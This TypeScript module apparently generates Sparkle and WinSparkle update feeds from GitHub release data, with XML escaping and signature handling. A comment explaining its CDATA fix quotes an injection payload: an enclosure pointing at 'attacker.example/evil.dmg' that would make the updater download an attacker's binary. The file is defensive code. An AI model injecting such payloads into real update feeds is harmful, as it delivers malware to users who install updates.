/// <reference types="@cloudflare/workers-types" />

/**
 * Sparkle appcast generation.
 *
 * The first product baked appcast.xml at build time with Sparkle's `generate_appcast`.
 * Here the Worker GENERATES it on the fly from GitHub release + asset metadata so any product
 * gets a feed for free. The mandatory `sparkle:edSignature` is NOT recomputed (the
 * Worker never holds the private key) — it is read from a sibling `<dmg>.sig` asset
 * that the release pipeline uploads alongside the DMG, exactly as Sparkle expects.
 * The `sparkle:version` (build) and `sparkle:shortVersionString` come from the tag.
 *
 * Output is deterministic given its inputs (no `Date.now()`), so it snapshot-tests.
 */

import type { Release, ReleaseAsset } from "../release/github.js";
import { versionFromTag } from "../release/channels.js";

export { versionFromTag } from "../release/channels.js";

export interface AppcastItemInput {
  /** Human title, e.g. `djdl 1.2.3`. */
  title: string;
  /** Marketing version string (CFBundleShortVersionString), e.g. `1.2.3`. */
  shortVersion: string;
  /** Build version (CFBundleVersion); falls back to shortVersion when unknown. */
  build: string;
  /** Full enclosure URL the updater downloads (points back at this gateway). */
  url: string;
  /** Enclosure byte length. */
  length: number;
  /** RFC-1123 pubDate string (already formatted; kept explicit for determinism). */
  pubDate: string;
  /** Base64 EdDSA signature from the sibling `.sig` asset. Omitted when no sidecar exists,
   *  in which case the enclosure renders WITHOUT a `sparkle:edSignature` attribute. */
  edSignature?: string;
  /** Optional minimum macOS version (sparkle:minimumSystemVersion). */
  minimumSystemVersion?: string;
  /** Optional HTML release notes embedded as the item <description>. */
  descriptionHtml?: string;
  // ── P3-09: the extended appcast (Sparkle 2.9–2.10, notes/E1) and WinSparkle ──
  /** `<sparkle:hardwareRequirements>` (Sparkle 2.9+): `arm64` for an Apple-silicon-only build. */
  hardwareRequirements?: string;
  /**
   * `<sparkle:criticalUpdate/>`: `{}` for an update critical to everyone, `{ version }` for one
   * critical only to installs whose bundle version is below `version`.
   */
  criticalUpdate?: { version?: string };
  /** `<sparkle:phasedRolloutInterval>` seconds (Sparkle phases over seven groups). */
  phasedRolloutInterval?: number;
  /** `<sparkle:deltas>`: one enclosure per old build the delta updates from. */
  deltas?: AppcastDelta[];
  /** WinSparkle: `sparkle:os` on the enclosure (`windows-x64`, `windows-arm64`, `windows`). */
  os?: string;
  /** WinSparkle: `sparkle:installerArguments` on the enclosure. */
  installerArguments?: string;
  /**
   * WinSparkle: further enclosures of the same item (one per Windows architecture), each with
   * its own `sparkle:os`. WinSparkle 0.8.3+ picks the one matching its machine.
   */
  extraEnclosures?: AppcastEnclosure[];
  /** WinSparkle reads the versions from the enclosure: repeat them there as attributes. */
  versionOnEnclosure?: boolean;
}

/** One `<sparkle:deltas>` enclosure. */
export interface AppcastDelta {
  url: string;
  length: number;
  /** The build number (`sparkle:version`) the delta updates FROM. */
  deltaFrom: string;
  edSignature?: string;
}

/** One further enclosure of an item (WinSparkle's per-architecture installers). */
export interface AppcastEnclosure {
  url: string;
  length: number;
  edSignature?: string;
  os?: string;
  installerArguments?: string;
}

export interface AppcastInput {
  /** Channel feed title, e.g. `djdl` or `djdl (beta)`. */
  channelTitle: string;
  /** Feed link (the product site / origin). */
  link: string;
  items: AppcastItemInput[];
}

const XML_ESCAPES: Record<string, string> = {
  "&": "&amp;",
  "<": "&lt;",
  ">": "&gt;",
  '"': "&quot;",
  "'": "&apos;",
};

function xmlEscape(s: string): string {
  return s.replace(/[&<>"']/g, (c) => XML_ESCAPES[c] ?? c);
}

/**
 * Neutralise a CDATA terminator (R6-13 / R9-08).
 *
 * A `<![CDATA[…]]>` section ends at the FIRST `]]>` in its content, so a release note containing
 * one closes the section early and everything after it is parsed as sibling XML — including a
 * second `<enclosure url="https://attacker.example/evil.dmg" />`, which is an updater pointed at
 * an attacker's binary. The standard escape splits the sequence across two sections: `]]` ends
 * the first, `]]>` re-opens with `<![CDATA[`, and the `>` lands as ordinary character data. The
 * text a client sees is byte-identical; the parse is not.
 *
 * This was Info-rated only because `descriptionHtml` had no producer. P2.T4 gives it one, so the
 * fix lands in the same change.
 */
function neutralizeCdata(s: string): string {
  return s.split("]]>").join("]]]]><![CDATA[>");
}

/**
 * Render prose as the HTML the `<description>` element expects.
 *
 * `extractSummary` returns markdown-stripped PROSE, and `stripMarkdown` is explicitly not an
 * HTML sanitiser — it removes emphasis and link syntax and leaves raw HTML intact (R6-13). So
 * the summary is escaped rather than trusted: a release note that contains `<script>` arrives in
 * the feed as the four characters `&lt;s`… and renders as text in Sparkle's release-notes view.
 * That is the layer above `neutralizeCdata`, which stops the XML breakout; this one stops the
 * markup that would otherwise survive it.
 */
export function proseToHtml(text: string): string {
  return text.replace(/[&<>"']/g, (c) => XML_ESCAPES[c] ?? c);
}

function enclosureAttrs(item: AppcastItemInput, e: AppcastEnclosure): string {
  const versions = item.versionOnEnclosure
    ? ` sparkle:version="${xmlEscape(item.build)}" sparkle:shortVersionString="${xmlEscape(item.shortVersion)}"`
    : "";
  const os = e.os ? ` sparkle:os="${xmlEscape(e.os)}"` : "";
  const args = e.installerArguments
    ? ` sparkle:installerArguments="${xmlEscape(e.installerArguments)}"`
    : "";
  // When the pipeline didn't publish a sibling `.sig`, omit the attribute rather than 404 —
  // the feed is still valid; Sparkle clients that require signing simply won't auto-update.
  const ed = e.edSignature
    ? ` sparkle:edSignature="${xmlEscape(e.edSignature)}"`
    : "";
  return `url="${xmlEscape(e.url)}"${versions}${os}${args} type="application/octet-stream" length="${e.length}"${ed}`;
}

/** Render one `<item>`. The DMG enclosure carries the Sparkle EdDSA attributes. */
function renderItem(item: AppcastItemInput): string {
  const minSys = item.minimumSystemVersion
    ? `\n      <sparkle:minimumSystemVersion>${xmlEscape(item.minimumSystemVersion)}</sparkle:minimumSystemVersion>`
    : "";
  const hw = item.hardwareRequirements
    ? `\n      <sparkle:hardwareRequirements>${xmlEscape(item.hardwareRequirements)}</sparkle:hardwareRequirements>`
    : "";
  const critical = item.criticalUpdate
    ? item.criticalUpdate.version
      ? `\n      <sparkle:criticalUpdate sparkle:version="${xmlEscape(item.criticalUpdate.version)}" />`
      : `\n      <sparkle:criticalUpdate />`
    : "";
  const phased =
    item.phasedRolloutInterval !== undefined
      ? `\n      <sparkle:phasedRolloutInterval>${item.phasedRolloutInterval}</sparkle:phasedRolloutInterval>`
      : "";
  const desc = item.descriptionHtml
    ? `\n      <description><![CDATA[${neutralizeCdata(item.descriptionHtml)}]]></description>`
    : "";
  const enclosures = [
    {
      url: item.url,
      length: item.length,
      ...(item.edSignature ? { edSignature: item.edSignature } : {}),
      ...(item.os ? { os: item.os } : {}),
      ...(item.installerArguments
        ? { installerArguments: item.installerArguments }
        : {}),
    },
    ...(item.extraEnclosures ?? []),
  ]
    .map((e) => `\n      <enclosure ${enclosureAttrs(item, e)} />`)
    .join("");
  const deltas = item.deltas?.length
    ? `\n      <sparkle:deltas>${item.deltas
        .map(
          (d) =>
            `\n        <enclosure url="${xmlEscape(d.url)}" sparkle:version="${xmlEscape(item.build)}" sparkle:shortVersionString="${xmlEscape(item.shortVersion)}" sparkle:deltaFrom="${xmlEscape(d.deltaFrom)}" type="application/octet-stream" length="${d.length}"${
              d.edSignature
                ? ` sparkle:edSignature="${xmlEscape(d.edSignature)}"`
                : ""
            } />`,
        )
        .join("")}\n      </sparkle:deltas>`
    : "";
  return `    <item>
      <title>${xmlEscape(item.title)}</title>
      <pubDate>${xmlEscape(item.pubDate)}</pubDate>
      <sparkle:version>${xmlEscape(item.build)}</sparkle:version>
      <sparkle:shortVersionString>${xmlEscape(item.shortVersion)}</sparkle:shortVersionString>${minSys}${hw}${critical}${phased}${desc}${enclosures}${deltas}
    </item>`;
}

/** Render the full appcast document. Deterministic given its inputs. */
export function renderAppcast(input: AppcastInput): string {
  const items = input.items.map(renderItem).join("\n");
  return `<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:sparkle="http://www.andymatuschak.org/xml-namespaces/sparkle" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>${xmlEscape(input.channelTitle)}</title>
    <link>${xmlEscape(input.link)}</link>
${items ? `${items}\n` : ""}  </channel>
</rss>
`;
}

/** Format epoch seconds (or null, = the epoch) as an RFC-1123 pubDate. */
export function rfc1123Seconds(seconds: number | null): string {
  return new Date((seconds ?? 0) * 1000).toUTCString();
}

/** XML-escape a value for an attribute or text node (exported for the other XML renderers). */
export { xmlEscape };

/** Format an ISO timestamp (or null) to an RFC-1123 pubDate. Falls back to epoch. */
function rfc1123(iso: string | null): string {
  const d = iso ? new Date(iso) : new Date(0);
  return d.toUTCString();
}

/**
 * Build the appcast item input for a release + its DMG asset, reading the EdDSA
 * signature the caller already fetched from the sibling `.sig` asset. The enclosure
 * `url` is supplied by the caller (it points back through this gateway).
 */
export function buildAppcastItem(
  release: Release,
  dmg: ReleaseAsset,
  edSignature: string | null | undefined,
  enclosureUrl: string,
  opts: {
    title?: string;
    minimumSystemVersion?: string;
    descriptionHtml?: string;
  } = {},
): AppcastItemInput {
  const shortVersion = versionFromTag(release.tag_name);
  return {
    title: opts.title ?? `${shortVersion}`,
    shortVersion,
    build: shortVersion,
    url: enclosureUrl,
    length: dmg.size,
    pubDate: rfc1123(release.published_at),
    ...(edSignature ? { edSignature } : {}),
    ...(opts.minimumSystemVersion
      ? { minimumSystemVersion: opts.minimumSystemVersion }
      : {}),
    ...(opts.descriptionHtml ? { descriptionHtml: opts.descriptionHtml } : {}),
  };
}
